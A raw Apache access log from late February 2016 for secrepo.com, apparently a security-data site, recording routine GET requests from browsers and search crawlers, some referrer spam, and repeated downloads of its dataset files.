137.132.3.8 - - [28/Feb/2016:02:04:01 -0800] "GET / HTTP/1.1" 200 8680 "https://www.google.com.sg/" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
137.132.3.8 - - [28/Feb/2016:02:04:01 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
137.132.3.8 - - [28/Feb/2016:02:04:02 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
137.132.3.8 - - [28/Feb/2016:02:04:02 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
40.77.167.57 - - [28/Feb/2016:02:08:38 -0800] "GET /self.logs/error.log.2015-05-14.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
178.137.81.41 - - [28/Feb/2016:02:10:09 -0800] "GET /honeypot/ HTTP/1.1" 418 676 "http://pornogig.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
202.110.105.127 - - [28/Feb/2016:02:10:24 -0800] "GET /tg/a.zip HTTP/1.1" 200 11230440 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
202.110.105.127 - - [28/Feb/2016:02:10:24 -0800] "GET /tg/a.zip HTTP/1.1" 200 8583600 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
202.110.105.127 - - [28/Feb/2016:02:10:24 -0800] "GET /tg/a.zip HTTP/1.1" 200 5976780 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
202.110.105.127 - - [28/Feb/2016:02:10:24 -0800] "GET /tg/a.zip HTTP/1.1" 200 11100720 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
120.24.169.36 - - [28/Feb/2016:02:16:50 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
117.190.191.170 - - [28/Feb/2016:02:21:09 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
64.79.100.53 - - [28/Feb/2016:02:28:32 -0800] "GET /robots.txt HTTP/1.1" 200 297 "http://www.secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:32 -0800] "GET / HTTP/1.1" 200 8643 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:32 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:33 -0800] "GET / HTTP/1.1" 301 446 "http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:33 -0800] "GET / HTTP/1.1" 200 8643 "http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:33 -0800] "GET /data HTTP/1.1" 404 303 "http://www.secrepo.com/data" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:33 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:33 -0800] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 44982 "http://www.secrepo.com/maccdc2012/dhcp.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:33 -0800] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45019 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:33 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 901418 "http://www.secrepo.com/maccdc2012/conn.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:33 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 903384 "http://www.secrepo.com/maccdc2012/dns.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:35 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 1572515 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:36 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 1637345 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:38 -0800] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 128079 "http://www.secrepo.com/maccdc2012/ftp.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:38 -0800] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 128116 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:39 -0800] "GET /maccdc2012/notice.log.gz HTTP/1.1" 200 20742 "http://www.secrepo.com/maccdc2012/notice.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:39 -0800] "GET /maccdc2012/notice.log.gz HTTP/1.1" 200 20779 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:39 -0800] "GET /maccdc2012/signatures.log.gz HTTP/1.1" 200 568 "http://www.secrepo.com/maccdc2012/signatures.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:39 -0800] "GET /maccdc2012/signatures.log.gz HTTP/1.1" 200 605 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:39 -0800] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 200 6871 "http://www.secrepo.com/maccdc2012/smtp.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:39 -0800] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 200 6908 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:39 -0800] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 200 182480 "http://www.secrepo.com/maccdc2012/ssh.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:38 -0800] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 905797 "http://www.secrepo.com/maccdc2012/files.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:40 -0800] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 200 182517 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:40 -0800] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 1394226 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:38 -0800] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 910177 "http://www.secrepo.com/maccdc2012/http.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:41 -0800] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 1637346 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:42 -0800] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5192 "http://www.secrepo.com/maccdc2012/tunnel.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:42 -0800] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5229 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:43 -0800] "GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1" 200 100740 "http://www.secrepo.com/maccdc2012/maccdc2012_fast_alert.7z" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:43 -0800] "GET /maccdc2012/maccdc2012_full_alert.7z HTTP/1.1" 200 109500 "http://www.secrepo.com/maccdc2012/maccdc2012_full_alert.7z" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:43 -0800] "GET /tg/tg_snort_fast.7z HTTP/1.1" 200 90520 "http://www.secrepo.com/tg/tg_snort_fast.7z" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:41 -0800] "GET /maccdc2012/ssl.log.gz HTTP/1.1" 200 1056028 "http://www.secrepo.com/maccdc2012/ssl.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:43 -0800] "GET /tg/tg_snort_full.7z HTTP/1.1" 200 62819 "http://www.secrepo.com/tg/tg_snort_full.7z" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:43 -0800] "GET /self.logs/ HTTP/1.1" 200 8560 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:44 -0800] "GET /self.logs/ HTTP/1.1" 200 8597 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:43 -0800] "GET /maccdc2012/ssl.log.gz HTTP/1.1" 200 1313675 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:42 -0800] "GET /maccdc2012/weird.log.gz HTTP/1.1" 200 900760 "http://www.secrepo.com/maccdc2012/weird.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:45 -0800] "GET /maccdc2012/weird.log.gz HTTP/1.1" 200 1242776 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:44 -0800] "GET /squid/access.log.gz HTTP/1.1" 200 2212793 "http://www.secrepo.com/squid/access.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:47 -0800] "GET /honeypot/BSidesDFW-2014.ipynb HTTP/1.1" 404 303 "http://www.secrepo.com/honeypot/BSidesDFW-2014.ipynb" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:47 -0800] "GET / HTTP/1.1" 301 446 "http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:47 -0800] "GET / HTTP/1.1" 200 8643 "http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:46 -0800] "GET /squid/access.log.gz HTTP/1.1" 200 1767009 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:45 -0800] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554487 "http://www.secrepo.com/auth.log/auth.log.gz" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
64.79.100.53 - - [28/Feb/2016:02:28:47 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla" 
64.79.100.53 - - [28/Feb/2016:02:28:47 -0800] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554523 "-" "Mozilla" 
82.94.33.208 - - [28/Feb/2016:02:35:11 -0800] "GET / HTTP/1.1" 200 8680 "http://www.mlsecproject.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
82.94.33.208 - - [28/Feb/2016:02:35:12 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
82.94.33.208 - - [28/Feb/2016:02:35:12 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
82.94.33.208 - - [28/Feb/2016:02:35:12 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
40.77.167.89 - - [28/Feb/2016:02:39:47 -0800] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928460 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)" 
122.228.18.195 - - [28/Feb/2016:02:44:59 -0800] "GET /tg/a.zip HTTP/1.1" 200 152496 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
122.228.18.195 - - [28/Feb/2016:02:44:59 -0800] "GET /tg/a.zip HTTP/1.1" 200 232980 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
122.228.18.195 - - [28/Feb/2016:02:45:08 -0800] "GET /tg/a.zip HTTP/1.1" 200 456076 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
77.75.78.165 - - [28/Feb/2016:02:47:30 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
77.75.78.165 - - [28/Feb/2016:02:47:31 -0800] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5229 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
42.2.238.211 - - [28/Feb/2016:02:51:43 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4" 
42.2.238.211 - - [28/Feb/2016:02:51:43 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4" 
42.2.238.211 - - [28/Feb/2016:02:51:43 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4" 
42.2.238.211 - - [28/Feb/2016:02:51:44 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4" 
211.137.56.194 - - [28/Feb/2016:02:53:55 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.118 - - [28/Feb/2016:02:55:48 -0800] "GET /self.logs/access.log.2015-05-16.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
37.130.229.148 - - [28/Feb/2016:03:14:24 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0" 
113.238.161.26 - - [28/Feb/2016:03:17:37 -0800] "GET /tg/a.zip HTTP/1.1" 200 2151360 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
113.238.161.26 - - [28/Feb/2016:03:17:37 -0800] "GET /tg/a.zip HTTP/1.1" 200 2609280 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
113.238.161.26 - - [28/Feb/2016:03:17:37 -0800] "GET /tg/a.zip HTTP/1.1" 200 2590560 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
113.238.161.26 - - [28/Feb/2016:03:17:37 -0800] "GET /tg/a.zip HTTP/1.1" 200 2720160 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
218.200.66.203 - - [28/Feb/2016:03:22:54 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
211.137.56.201 - - [28/Feb/2016:03:23:20 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
211.137.56.172 - - [28/Feb/2016:03:24:55 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
40.77.167.89 - - [28/Feb/2016:03:30:42 -0800] "GET /self.logs/error.log.2015-06-12.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
46.119.127.64 - - [28/Feb/2016:03:36:39 -0800] "GET /honeypot/ HTTP/1.1" 200 1077 "http://rostov.xrus.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.3 (build 01218); .NET CLR 1.1.4322)" 
46.119.127.64 - - [28/Feb/2016:03:36:40 -0800] "GET /honeypot/ HTTP/1.1" 200 1077 "http://rostov.xrus.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.3 (build 01218); .NET CLR 1.1.4322)" 
46.119.127.64 - - [28/Feb/2016:03:36:40 -0800] "GET /honeypot/ HTTP/1.1" 200 1077 "http://rostov.xrus.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.3 (build 01218); .NET CLR 1.1.4322)" 
43.224.212.105 - - [28/Feb/2016:03:49:04 -0800] "GET /tg/a.zip HTTP/1.1" 200 47520 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
43.224.212.105 - - [28/Feb/2016:03:49:04 -0800] "GET /tg/a.zip HTTP/1.1" 200 504000 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
43.224.212.105 - - [28/Feb/2016:03:49:04 -0800] "GET /tg/a.zip HTTP/1.1" 200 233280 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
43.224.212.105 - - [28/Feb/2016:03:49:04 -0800] "GET /tg/a.zip HTTP/1.1" 200 272160 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
66.249.64.250 - - [28/Feb/2016:03:53:38 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
111.7.128.40 - - [28/Feb/2016:03:54:02 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
115.28.37.33 - - [28/Feb/2016:04:05:35 -0800] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 782560 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
122.193.14.108 - - [28/Feb/2016:04:06:14 -0800] "GET http://www.secrepo.com/honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.0" 200 1733020 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
111.23.10.33 - - [28/Feb/2016:04:06:34 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
112.26.227.170 - - [28/Feb/2016:04:18:25 -0800] "GET /tg/a.zip HTTP/1.1" 200 77760 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
112.26.227.170 - - [28/Feb/2016:04:18:25 -0800] "GET /tg/a.zip HTTP/1.1" 200 408960 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
112.26.227.170 - - [28/Feb/2016:04:18:25 -0800] "GET /tg/a.zip HTTP/1.1" 200 676800 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
112.26.227.170 - - [28/Feb/2016:04:18:25 -0800] "GET /tg/a.zip HTTP/1.1" 200 214560 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
115.66.81.187 - - [28/Feb/2016:04:25:59 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:44.0) Gecko/20100101 Firefox/44.0" 
115.66.81.187 - - [28/Feb/2016:04:26:01 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:44.0) Gecko/20100101 Firefox/44.0" 
115.66.81.187 - - [28/Feb/2016:04:26:02 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:44.0) Gecko/20100101 Firefox/44.0" 
115.66.81.187 - - [28/Feb/2016:04:26:05 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:44.0) Gecko/20100101 Firefox/44.0" 
115.66.81.187 - - [28/Feb/2016:04:26:05 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:44.0) Gecko/20100101 Firefox/44.0" 
77.75.77.32 - - [28/Feb/2016:04:31:28 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
77.75.77.32 - - [28/Feb/2016:04:31:29 -0800] "GET /self.logs/error.log.2015-02-16.gz HTTP/1.1" 200 7453 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
100.13.11.92 - - [28/Feb/2016:04:41:00 -0800] "GET / HTTP/1.1" 200 8680 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" 
100.13.11.92 - - [28/Feb/2016:04:41:00 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" 
100.13.11.92 - - [28/Feb/2016:04:41:00 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" 
100.13.11.92 - - [28/Feb/2016:04:41:00 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" 
59.189.15.214 - - [28/Feb/2016:04:45:18 -0800] "GET / HTTP/1.1" 200 8680 "http://www.mlsecproject.org/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0" 
59.189.15.214 - - [28/Feb/2016:04:45:19 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0" 
59.189.15.214 - - [28/Feb/2016:04:45:19 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0" 
59.189.15.214 - - [28/Feb/2016:04:45:19 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0" 
120.236.174.153 - - [28/Feb/2016:04:47:05 -0800] "GET /tg/a.zip HTTP/1.1" 200 608820 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
120.236.174.153 - - [28/Feb/2016:04:47:05 -0800] "GET /tg/a.zip HTTP/1.1" 200 646780 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
120.236.174.153 - - [28/Feb/2016:04:47:06 -0800] "GET /tg/a.zip HTTP/1.1" 200 511000 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
120.236.174.153 - - [28/Feb/2016:04:47:05 -0800] "GET /tg/a.zip HTTP/1.1" 200 556260 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
207.46.13.94 - - [28/Feb/2016:05:06:38 -0800] "GET /self.logs/access.log.2016-01-01.gz HTTP/1.1" 200 5505 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
106.85.223.86 - - [28/Feb/2016:05:15:18 -0800] "GET /tg/a.zip HTTP/1.1" 200 8928000 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
106.85.223.86 - - [28/Feb/2016:05:15:18 -0800] "GET /tg/a.zip HTTP/1.1" 200 12159360 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
106.85.223.86 - - [28/Feb/2016:05:15:18 -0800] "GET /tg/a.zip HTTP/1.1" 200 1167840 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
106.85.223.86 - - [28/Feb/2016:05:15:19 -0800] "GET /tg/a.zip HTTP/1.1" 200 960480 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
117.190.191.170 - - [28/Feb/2016:05:21:09 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
